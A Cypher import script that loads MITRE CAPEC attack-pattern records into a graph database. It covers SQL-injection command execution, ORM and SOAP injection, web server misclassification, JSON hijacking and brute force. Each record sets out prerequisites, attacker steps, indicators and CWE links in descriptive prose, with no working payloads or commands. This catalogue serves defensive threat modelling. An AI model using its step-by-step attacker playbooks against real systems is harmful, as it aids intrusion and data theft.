CREATE (:AttackStep{id: 2, title: "Execute malicious HTTP Trace launching script", description: "<div level=\"0\">\n  <p class=\"text\">The attacker leverages a vulnerability to force the victim to execute the malicious HTTP Trace launching script</p>\n</div>"});
MERGE (:Reference{local_id: "R.107.1", author: "Jeremiah Grossman", title: "Cross-Site Tracing (XST)", publisher: "WhiteHat Security", pubdate: "2003", link: "http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf"});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 648});
CREATE (:ResourcesRequired{id: 10, text: "<div level=\"0\">\n  <p class=\"text\">No specialized resources are needed</p>\n</div>"});
CREATE (:AttackPattern{id: 108, name: "Command Line Execution through SQL Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 29, text: "<div level=\"0\">\n  <p class=\"text\">The application does not properly validate data before storing in the database</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 30, text: "<div level=\"0\">\n  <p class=\"text\">Backend application implicitly trusts the data stored in the database</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 31, text: "<div level=\"0\">\n  <p class=\"text\">Malicious data is used on the backend as a command line argument</p>\n</div>"});
CREATE (:Submission{id: 83});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 83, summary: "OrderedDict([('Text', 'An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Probe for SQL Injection vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an error message from server indicating that there was a problem with the SQL query.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one user-controllable input susceptible to injection found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No user-controllable input susceptible to injection found."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker's injected code is executed."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Inject malicious data in the database", description: "<div level=\"0\">\n  <p class=\"text\">Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Trigger command line execution with injected arguments", description: "<div level=\"0\">\n  <p class=\"text\">The attacker causes execution of command line functionality which leverages previously injected database content as arguments.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker's injected code is executed."});
MERGE (:CWE{id: 89});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 78});
MERGE (:CWE{id: 114});
CREATE (:ResourcesRequired{id: 11, text: "<div level=\"0\">\n  <p class=\"text\">No specialized resources are required</p>\n</div>"});
CREATE (:AttackPattern{id: 109, name: "Object Relational Mapping Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 32, text: "<div level=\"0\">\n  <p class=\"text\">An application uses data access layer generated by an ORM tool or framework</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 33, text: "<div level=\"0\">\n  <p class=\"text\">An application uses user supplied data in queries executed against the database</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 34, text: "<div level=\"0\">\n  <p class=\"text\">The separation between data plane and control plane is not ensured, through either developer error or an underlying weakness in the data access layer code generation framework</p>\n</div>"});
CREATE (:Submission{id: 84});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 84, summary: "OrderedDict([('Text', 'An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject his or her own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine Persistence Framework Used", description: "<div level=\"0\">\n  <p class=\"text\">An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there.</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Probe for ORM Injection vulnerabilities", description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an error message from server indicating that there was a problem with the data query.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Perform SQL Injection through the generated data access layer", description: "<div level=\"0\">\n  <p class=\"text\">An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker achieves goal of unauthorized system access, denial of service, etc."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker unable to exploit SQL Injection vulnerability."});
MERGE (:Reference{id: "REF-4", local_id: "R.109.1", title: "OWASP Testing Guide", section: "Testing for ORM Injection (OWASP-DV-007)", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_ORM_Injection"});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 100});
MERGE (:CWE{id: 89});
MERGE (:CWE{id: 564});
CREATE (:ResourcesRequired{id: 12, text: "<div level=\"0\">\n  <p class=\"text\">No specialized resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 11, name: "Cause Web Server Misclassification", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 35, text: "<div level=\"0\">\n  <p class=\"text\">Web server software must rely on file name or file extension for processing.</p>\n</div>"});
CREATE (:Submission{id: 85});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 55});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 85, summary: "OrderedDict([('Text', [\"An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process.\", \"This type of vulnerability has been found in many widely used servers including IIS, Lotus Domino, and Orion. The attacker's job in this case is straightforward, standard communication protocols and methods are used and are generally appended with malicious information at the tail end of an otherwise legitimate request. The attack payload varies, but it could be special characters like a period or simply appending a tag that has a special meaning for operations on the server side like .jsp for a java application server. The essence of this attack is that the attacker deceives the server into executing functionality based on the name of the request, i.e. login.jsp, not the contents.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Footprint file input vectors", description: "<div level=\"0\">\n  <p class=\"text\">Manually or using an automated tool, an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker manually crawls application to identify file inputs</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Attacker uses an automated tool to crawl application identify file inputs</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Attacker manually assesses strength of access control protecting native application files from user control</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Attacker explores potential for submitting files directly to the web server via independently constructed HTTP Requests</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Application submits files under user control to the web server</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Application does not submit files under user control to the web server</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Application strictly protects all native application files from user control</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "User-controllable files are identified"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "File misclassification shotgunning", description: "<div level=\"0\">\n  <p class=\"text\">An attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The web server uses the wrong handler to execute the file, as expected by the attacker.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No result from the web server.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The web server ignore the manipulation and process the request has it should have been.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Web server exhibits unexpected behavior."});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "File misclassification sniping", description: "<div level=\"0\">\n  <p class=\"text\">Understanding how certain file types are processed by web servers, an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Craft a malicious file payload, modify file extension to the targeted file type and submit it to the web server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Craft a malicious file payload, modify its associated MIME type to the targeted file type and submit it to the web server.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The web server uses the wrong handler to execute the file, as expected by the attacker.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No result from the web server.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The web server ignore the manipulation and process the request has it should have been.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker's payload is acted on by web server."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker cannot get the web server to misclassify a file."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Disclose information", description: "<div level=\"0\">\n  <p class=\"text\">The attacker, by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manipulate the file names that are explicitly sent to the server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Manipulate the MIME sent in order to confuse the web server.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the information from the server"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.11.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{local_id: "R.11.2", title: "Orion Application Server JSP Source Disclosure Vulnerability (Bugtraq ID: 17204)", publisher: "SecurityFocus", pubdate: "Mar 23 2006", link: "http://www.securityfocus.com/bid/17204/info"});
MERGE (:CWE{id: 69});
MERGE (:CWE{id: 77});
CREATE (:ResourcesRequired{id: 13, text: "<div level=\"0\">\n  <p class=\"text\">Ability to execute HTTP request to Web server</p>\n</div>"});
CREATE (:AttackPattern{id: 110, name: "SQL Injection through SOAP Parameter Tampering", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 36, text: "<div level=\"0\">\n  <p class=\"text\">SOAP messages are used as a communication mechanism in the system</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 37, text: "<div level=\"0\">\n  <p class=\"text\">SOAP parameters are not properly validated at the service provider</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 38, text: "<div level=\"0\">\n  <p class=\"text\">The service provider does not properly utilize parameter binding when building SQL queries</p>\n</div>"});
CREATE (:Submission{id: 86});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 86, summary: "OrderedDict([('Text', 'An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Detect Incorrect SOAP Parameter Handling", description: "<div level=\"0\">\n  <p class=\"text\">The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">SOAP messages are used as a communication mechanism in the system</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Any indication that the injected input is causing system trouble (e.g. stack traces are produced, the system does not respond, etc.) then the attacker may come to conclude that the system is vulnerable to SQL injection through SOAP parameter tampering."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe for SQL Injection vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an error message from server indicating that there was a problem with the SQL query.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one SOAP parameter susceptible to injection found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No SOAP parameter susceptible to injection found."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Inject SQL via SOAP Parameters", description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker achieves goal of unauthorized system access, denial of service, etc."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker unable to exploit SQL Injection vulnerability."});
MERGE (:CWE{id: 89});
MERGE (:CWE{id: 20});
CREATE (:ResourcesRequired{id: 14, text: "<div level=\"0\">\n  <p class=\"text\">No specialized hardware resources are required</p>\n</div>"});
CREATE (:AttackPattern{id: 111, name: "JSON Hijacking (aka JavaScript Hijacking)", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 39, text: "<div level=\"0\">\n  <p class=\"text\">JSON is used as a transport mechanism between the client and the server</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 40, text: "<div level=\"0\">\n  <p class=\"text\">The target server cannot differentiate real requests from forged requests</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 41, text: "<div level=\"0\">\n  <p class=\"text\">The JSON object returned from the server can be accessed by the attackers' malicious code via a script tag</p>\n</div>"});
CREATE (:Submission{id: 87});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 56});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 87, summary: "OrderedDict([('Text', [\"An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website.\", \"An attacker gets the victim to visit his or her malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server.\", \"There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Understand How to Request JSON Responses from the Target System", description: "<div level=\"0\">\n  <p class=\"text\">An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers' ability to craft the exploit.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Targeted application leverages JSON in its architecture.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Craft a malicious website", description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts a malicious website to which he plans to lure the victim who is using the vulnerable target system. The malicious website does two things:</p>\n  <p class=\"text\">This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain.</p>\n  <div level=\"1\">\n    <p class=\"text\">1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest).</p>\n    <p class=\"text\">2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker.</p>\n  </div>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The JSON object hook captures, reads and forwards JSON objects"});
CREATE (:Outcome{id: 2, type: "Success", description: "The malicious website effectively requests JSON objects from the target system"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Launch JSON hijack", description: "<div level=\"0\">\n  <p class=\"text\">An attacker lures the victim to the malicious website or leverages other means to get his malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker employs a myriad of standard techniques to get the victim to visit his or her malicious site or by some other means get the attackers' malicious code executing in the victim's browser.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The sensitive contents of captured JSON objects are readable by the attacker."});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 352});
CREATE (:ResourcesRequired{id: 15, text: "<div level=\"0\">\n  <p class=\"text\">No specialized hardware resources are required. The attacker needs to have knowledge of the URLs that need to be accessed on the target system to request the JSON objects.</p>\n</div>"});
CREATE (:AttackPattern{id: 112, name: "Brute Force", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 42, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to determine when they have successfully guessed the secret. As such, one-time pads are immune to this type of attack since there is no way to determine when a guess is correct.</p>\n</div>"});
CREATE (:Submission{id: 88});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 88, summary: "OrderedDict([('Text', ['In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset. Examples of secrets can include, but are not limited to, passwords, encryption keys, database lookup keys, and initial values to one-way functions.', \"The key factor in this attack is the attackers' ability to explore the possible secret space rapidly. This, in turn, is a function of the size of the secret space and the computational power the attacker is able to bring to bear on the problem. If the attacker has modest resources and the secret space is large, the challenge facing the attacker is intractable. While the defender cannot control the resources available to an attacker, they can control the size of the secret space. Creating a large secret space involves selecting one's secret from as large a field of equally likely alternative secrets as possible and ensuring that an attacker is unable to reduce the size of this field using available clues or cryptanalysis. Doing this is more difficult than it sounds since elimination of patterns (which, in turn, would provide an attacker clues that would help them reduce the space of potential secrets) is difficult to do using deterministic machines, such as computers. Assuming a finite secret space, a brute force attack will eventually succeed. The defender must rely on making sure that the time and resources necessary to do so will exceed the value of the information. For example, a secret space that will likely take hundreds of years to explore is likely safe from raw-brute force attacks.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine secret testing procedure", description: "<div level=\"0\">\n  <p class=\"text\">Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attackers' position is significantly degraded.</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Reduce search space", description: "<div level=\"0\">\n  <p class=\"text\">Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">If the secret was chosen algorithmically, cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret.</p>\n</div>"});
CREATE (:AttackStep{id: 3, title: "Expand victory conditions", description: "<div level=\"0\">\n  <p class=\"text\">It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Gather information so attack can be performed independently.", description: "<div level=\"0\">\n  <p class=\"text\">If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).</p>\n</div>"});
MERGE (:CWE{id: 330});
MERGE (:CWE{id: 326});
MERGE (:CWE{id: 521});
CREATE (:ResourcesRequired{id: 16, text: "<div level=\"0\">\n  <p class=\"text\">Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources the attacker has at their disposal. This attack method is resource expensive: having large amounts of computational power do not guarantee timely success, but having only minimal resources makes the problem intractable against all but the weakest secret selection procedures.</p>\n</div>"});
CREATE (:AttackPattern{id: 113, name: "API Manipulation", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 43, text: "<div level=\"0\">\n  <p class=\"text\">The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.</p>\n</div>"});
CREATE (:Submission{id: 89});
